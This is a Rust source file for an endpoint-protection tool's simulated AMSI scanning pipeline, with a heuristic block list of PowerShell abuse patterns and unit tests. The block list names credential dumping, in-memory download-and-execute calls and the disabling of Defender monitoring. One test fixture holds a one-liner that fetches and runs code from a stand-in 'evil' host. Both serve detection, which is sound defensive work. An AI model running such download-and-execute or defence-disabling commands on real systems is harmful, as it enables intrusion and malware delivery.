//! AMSI content scanning pipeline.

use std::sync::atomic::{AtomicU64, Ordering};

static NEXT_AMSI_CONTEXT_HANDLE: AtomicU64 = AtomicU64::new(1);

/// Result of an AMSI scan.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum AmsiResult {
    Clean,
    NotDetected,
    Detected,
    BlockedByPolicy,
}

/// AMSI content scanner.
pub struct AmsiScanner {
    context_handle: u64,
}

impl AmsiScanner {
    /// Create a new scanner (initializes AMSI context).
    pub fn new() -> Result<Self, super::AmsiError> {
        if env_truthy("EGUARD_AMSI_INIT_FAIL") {
            return Err(super::AmsiError::InitFailed(
                "AMSI scanner initialization forced to fail by environment".to_string(),
            ));
        }

        Ok(Self {
            context_handle: NEXT_AMSI_CONTEXT_HANDLE.fetch_add(1, Ordering::Relaxed),
        })
    }

    /// Scan a buffer of content and return the verdict.
    pub fn scan_buffer(
        &self,
        content: &[u8],
        content_name: &str,
    ) -> Result<AmsiResult, super::AmsiError> {
        if self.context_handle == 0 {
            return Err(super::AmsiError::ScanFailed(
                "scanner context is uninitialized".to_string(),
            ));
        }

        if env_truthy("EGUARD_AMSI_BLOCK_BY_POLICY") {
            return Ok(AmsiResult::BlockedByPolicy);
        }

        let _ = content_name;
        Ok(heuristic_scan(content))
    }

    /// Scan a string and return the verdict.
    pub fn scan_string(
        &self,
        content: &str,
        content_name: &str,
    ) -> Result<AmsiResult, super::AmsiError> {
        self.scan_buffer(content.as_bytes(), content_name)
    }
}

impl Default for AmsiScanner {
    fn default() -> Self {
        Self { context_handle: 0 }
    }
}

fn env_truthy(name: &str) -> bool {
    std::env::var(name)
        .ok()
        .map(|raw| {
            matches!(
                raw.trim().to_ascii_lowercase().as_str(),
                "1" | "true" | "yes" | "on"
            )
        })
        .unwrap_or(false)
}

fn heuristic_scan(content: &[u8]) -> AmsiResult {
    if content.is_empty() {
        return AmsiResult::Clean;
    }

    let text = String::from_utf8_lossy(content).to_ascii_lowercase();

    // Very high-signal patterns for PowerShell/script abuse.
    const BLOCK_PATTERNS: [&str; 7] = [
        "invoke-mimikatz",
        "frombase64string(",
        "iex(",
        "downloadstring(",
        "amsiutils",
        "set-mppreference -disablerealtimemonitoring",
        "-enc ",
    ];

    if BLOCK_PATTERNS.iter().any(|needle| text.contains(needle)) {
        return AmsiResult::Detected;
    }

    if text.contains("powershell") || text.contains("wscript") || text.contains("cscript") {
        return AmsiResult::NotDetected;
    }

    AmsiResult::Clean
}

#[cfg(test)]
mod tests {
    use super::{heuristic_scan, AmsiResult, AmsiScanner};

    #[test]
    fn detects_high_signal_powershell_patterns() {
        let script = b"powershell -enc SQBFAFgA(...); IEX(New-Object Net.WebClient).DownloadString('http://evil')";
        assert!(matches!(heuristic_scan(script), AmsiResult::Detected));
    }

    #[test]
    fn returns_not_detected_for_generic_script_context() {
        let script = b"powershell -nop -w hidden";
        assert!(matches!(heuristic_scan(script), AmsiResult::NotDetected));
    }

    #[test]
    fn scanner_default_without_context_fails_scans() {
        let scanner = AmsiScanner::default();
        assert!(scanner.scan_string("powershell", "sample.ps1").is_err());
    }
}
